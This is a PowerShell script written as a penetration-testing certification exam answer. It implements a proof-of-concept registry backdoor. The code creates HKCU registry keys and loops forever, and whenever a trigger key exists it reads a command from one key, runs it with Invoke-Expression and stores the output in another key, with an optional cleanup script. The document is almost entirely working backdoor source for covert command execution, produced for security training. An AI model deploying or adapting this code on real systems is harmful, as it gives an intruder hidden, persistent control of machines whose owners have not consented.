## Powershell For Penetration Testers Exam Task 10 - Write a PoC backdoor which reads instructions/scripts from registry, could be triggered by creation of another registry key and stores the output back to Registry.
function Install-Registry-Malware
{ 
<#
.SYNOPSIS
A PowerShell script for creating a registry malware.
.DESCRIPTION
A PowerShell cmdlet script that install a malware that use windows registry to execute commands and store the output of that commands.
.PARAMTER registryInputPath
The path of the registry that contains the commands to execute.
.PARAMTER registryOutputPath
The path of the registry that contains the output of the commands executed.
.PARAMTER idleTime
The second to wait between the checks of the registry value.
.PARAMTER registryInputName
The name of the registry that contains the commands to execute.
.PARAMTER registryOutputName
The name of the registry that contains the output of the commands executed.
.PARAMTER registryCheckPath
The path of the registry that have to be set to start the commands execution.
.PARAMTER registryCheckName
The name of the registry that have to be set to start the commands execution.
.PARAMTER firstCommand
The first command that will be executed by the system.
.PARAMTER Activate
Use this switch to activate the malware immediately.
.PARAMTER cleanScript
Use this switch to create a script to remove the registries created.
The script will be create in the path "C:\Users\Public\Documents\clean.ps1"
.EXAMPLE
PS C:\> . .\Install-Registry-Malware
PS C:\> Install-Registry-Malware -Verbose -registryInputName  inputCommands 
PS C:\> Install-Registry-Malware -Activate
.LINK
https://technet.microsoft.com/es-es/library/ee176852.aspx
https://blogs.technet.microsoft.com/heyscriptingguy/2012/05/09/use-powershell-to-easily-create-new-registry-keys/
.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3190
#>
           
    [CmdletBinding()] Param( 

       [Parameter(Mandatory = $false)]
       [String]
       $registryInputPath = "HKCU:\Software",
       
       [Parameter(Mandatory = $false)]
       [String]
       $registryOutputPath = "HKCU:\Software",

       [Parameter(Mandatory = $false)]
       [int]
       $idleTime = 30,

       [Parameter(Mandatory = $false)]
       [String]
       $registryInputName = "inpTest",

       [Parameter(Mandatory = $false)]
       [String]
       $registryOutputName = "outTest",

       [Parameter(Mandatory = $false)]
       [String]
       $registryCheckPath = "HKCU:\Software",

       [Parameter(Mandatory = $false)]
       [String]
       $registryCheckName = "checkTest",

       [Parameter(Mandatory = $false)]
       [String]
       $firstCommand = "dir",

       [Parameter(Mandatory = $false)]
       [Switch]
       $activate,

       [Parameter(Mandatory = $false)]
       [Switch]
       $cleanScript


)


    
    
    #Create input and output registies
    New-Item -Path $registryInputPath -Name $registryInputName
    New-Item -Path $registryOutputPath -Name $registryOutputName

    #if the switch is activated creates the registry to start the malware immediately
    if ($activate){
    New-Item -Path $registryCheckPath -Name $registryCheckName
    }

    #sets registries paths
    $registryCheckComplete = "$registryCheckPath\$registryCheckName"
    $registryInputComplete = "$registryInputPath\$registryInputName"
    $registryOutputComplete = "$registryOutputPath\$registryOutputName"
    Set-Item -Path $registryInputComplete -Value "$firstCommand"


    #if the swith is activated creates the script to clean the registries
    if ($cleanScript){

    $cleanRegistryInputComplete = $registryInputComplete.replace(":","")
    $cleanRegistryOutputComplete = $registryOutputComplete.replace(":","")
    $cleanRegistryCheckComplete = $registryCheckComplete.replace(":","")

    Remove-item "C:\Users\Public\Documents\clean.ps1"
    Add-Content "C:\Users\Public\Documents\clean.ps1" "reg delete $cleanRegistryInputComplete /f"
    Add-Content "C:\Users\Public\Documents\clean.ps1" "reg delete $cleanRegistryOutputComplete /f"
    Add-Content "C:\Users\Public\Documents\clean.ps1" "reg delete $cleanRegistryCheckComplete /f"
    }

    #start the infinite loop of the malware
    while(1){
        if (Test-Path $registryCheckComplete){
            
            $command = Get-ItemProperty -path $registryInputComplete
            $command = $command.'(default)'
            Write-Verbose "executing $command"
            $commandOut = Invoke-Expression -Command:$command 
            Set-Item -Path $registryOutputComplete -Value "$commandOut"
        }

    Write-Verbose "sleeping $idleTime seconds"
    Start-Sleep -s $idleTime
    }
}